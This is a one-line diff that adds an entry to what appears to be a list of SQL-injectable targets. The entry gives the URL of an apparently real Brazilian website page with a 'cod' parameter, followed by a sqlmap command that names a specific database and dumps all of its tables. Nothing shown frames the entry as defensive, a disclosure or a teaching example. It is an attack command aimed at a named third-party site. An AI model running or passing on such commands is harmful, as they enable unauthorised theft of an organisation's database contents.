@@ -1,0 +1,1 @@
+https://www.aphpr.com.br/agenda_det.php?cod=7 (GET)  # sqlmap.py -u https://www.aphpr.com.br/agenda_det.php?cod=7 -D aphprcom_ger --tables --dump-all --threads 5 -v3
